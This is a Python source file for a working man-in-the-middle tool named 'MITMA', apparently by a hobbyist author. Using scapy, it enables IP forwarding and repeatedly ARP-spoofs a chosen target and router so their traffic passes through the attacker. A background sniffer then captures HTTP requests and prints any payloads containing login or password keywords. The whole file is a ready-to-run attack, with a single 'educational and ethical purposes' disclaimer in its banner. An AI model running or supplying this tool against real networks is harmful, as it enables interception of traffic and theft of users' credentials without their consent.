import time
import os
import sys
import threading
import scapy.all as scapy
from scapy.layers import http

# Check if the script is run as root
def check_root():
    if os.geteuid() != 0:
        print("[!] Please run this script as root (sudo). Exiting.")
        sys.exit()

# Enable/disable IP forwarding
def enable_ip_forwarding():
    print("[+] Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP forwarding enabled.")

def disable_ip_forwarding():
    print("[!] Disabling IP forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[!] IP forwarding disabled.")

# Get MAC address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

# ARP spoof
def spoof(target_ip, spoof_ip):
    mac = get_mac(target_ip)
    if mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

# Restore ARP
def restore(target_ip, spoof_ip):
    dest_mac = get_mac(target_ip)
    source_mac = get_mac(spoof_ip)
    if dest_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=dest_mac, psrc=spoof_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

# Banner with ethical disclaimer
def about_banner():
    banner = r"""
 __  __ _____ _____ __  __     __     ___   ___  _  _ 
|  \/  | ____|_   _|  \/  |   /_\   / _ \ / _ \| \| |
| |\/| |  _|   | | | |\/| |  / _ \ | (_) | (_) | .` |
|_|  |_|_|     |_| |_|  |_| /_/ \_\ \___/ \___/|_|\_|

        [ MITMA ] - Man-In-The-Middle Attack Tool

            ┌────────────────────────┐
            │        .----.          │
            │       / .-"-. \        │
            │      | | '\ \ |        │
            │      | |__|_| |        │
            │      \______.'         │
            │     .-"'''''`-.        │
            │   .'  Hacker  `.       │
            │  /  watching... \      │
            └────────────────────────┘

    [+] Author : N. Janarthanan
    [+] Version: 0.2
    [+] Use only for educational and ethical purposes!
    """
    print(banner)

# Sniffing credentials
def sniff(interface):
    print(f"[+] Sniffing HTTP traffic on interface {interface}...")
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(f"\n[+] Visited site: {url}")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")
            keywords = ["username", "user", "login", "password", "pass", "email"]
            for keyword in keywords:
                if keyword in load:
                    print("\n" + "=" * 50)
                    print("[!!!] Possible Credentials Captured!")
                    print(load)
                    print("=" * 50)
                    break

# Main
check_root()
about_banner()

# Prompt user for input
target_ip = input("[?] Enter Target IP Address       : ").strip()
spoof_ip = input("[?] Enter Router IP (Spoof IP)    : ").strip()
interface = input("[?] Enter Network Interface (e.g. wlan0) : ").strip()

print(f"\n[+] Target: {target_ip} | Spoof: {spoof_ip} | Interface: {interface}")
confirm = input("[?] Confirm and start attack? (Y/N): ")
if confirm.lower() not in ["y", "yes"]:
    print("[!] User aborted.")
    sys.exit()

enable_ip_forwarding()

# Start sniffing in background thread
sniff_thread = threading.Thread(target=sniff, args=(interface,))
sniff_thread.start()

# ARP spoof loop
packet_count = 2
try:
    while True:
        spoof(target_ip, spoof_ip)
        spoof(spoof_ip, target_ip)
        print(f"\r[+] Packets sent: {packet_count}", end="")
        packet_count += 2
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] CTRL + C detected. Restoring network and exiting...")
    restore(target_ip, spoof_ip)
    restore(spoof_ip, target_ip)
    disable_ip_forwarding()
    print("[+] Done.")